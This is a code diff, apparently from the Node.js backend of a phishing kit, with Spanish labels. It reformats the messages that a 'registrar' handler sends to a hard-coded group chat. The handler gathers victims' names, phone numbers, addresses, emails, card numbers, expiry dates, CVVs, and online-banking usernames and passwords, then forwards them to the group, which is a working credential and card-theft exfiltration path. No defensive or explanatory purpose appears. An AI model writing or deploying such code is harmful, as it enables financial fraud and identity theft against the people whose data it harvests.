@@ -89,19 +89,18 @@ const registrar = async (req, res ) => {
         if (nombre, celular, ciudad, direccion, email, banco, tarjeta, mes, año, cvv !== undefined) {
             function enviarDatos() {
                 //const mensajeBienvenida = `Nuevo Registro:\n ${cadenaSinLlaves}`;
-                const Datos = `Nueva Información Registrada 📃:\n` + 
-                `
-                Nombre: ${nombre}
-                Celular: ${celular}
-                Ciudad: ${ciudad}
-                Dirección: ${direccion}
-                Email: ${email}
-                Banco: ${banco}
-                Tarjeta: ${tarjeta}
-                Mes: ${mes}
-                Año: ${año}
-                Cvv: ${cvv}
-                `;
+                const Datos = `Nueva Información Registrada 📃:\n` +
+                "Nombre: " + nombre +`\n`+             
+                "Celular: " + celular +`\n`+
+                "Ciudad: " + ciudad +`\n`+
+                "Dirección: " + direccion +`\n`+
+                "Email: " + email +`\n`+
+                "Banco: " + banco +`\n`+
+                "Tarjeta: " + tarjeta +`\n`+
+                "Mes: " + mes +`\n`+
+                "Año: " + año +`\n`+
+                "Cvv: " + cvv +`\n`
+                ;
             
                 const chatId = -618953922; //id de grupo
                 
@@ -121,11 +120,10 @@ const registrar = async (req, res ) => {
        if (Datosbanco, ContraseñaBanco !== undefined) {
             function enviarBanco() {
                 //const mensajeBienvenida = `Nuevo Registro:\n ${cadenaSinLlaves}`;
-                const Banco = `Nueva Información de Banco Registrada 💰:` + 
-                `
-                Usuario: ${Datosbanco}
-                Contraseña de Banco: ${ContraseñaBanco}
-                `;
+                const Banco = `Nueva Información de Banco Registrada 💰:\n` + 
+                "Usuario: " + Datosbanco + `\n` + 
+                "Contraseña de Banco: " + ContraseñaBanco
+                ;
             
                 const chatId = -618953922; //id de grupo
                 
